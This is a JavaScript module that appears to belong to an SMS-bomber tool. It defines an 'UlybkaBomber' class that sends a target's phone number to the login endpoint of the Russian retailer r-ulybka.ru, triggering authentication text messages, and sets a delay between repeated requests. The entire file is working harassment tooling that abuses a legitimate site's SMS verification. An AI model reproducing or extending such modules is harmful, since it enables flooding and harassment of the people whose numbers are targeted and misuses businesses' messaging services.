const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class UlybkaBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            json: String({"action":"auth","phone":this.phone})
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "ulybka";
    delay = 31000;
    url = `https://www.r-ulybka.ru/login/form_ajax.php`;  
}
module.exports = UlybkaBomber;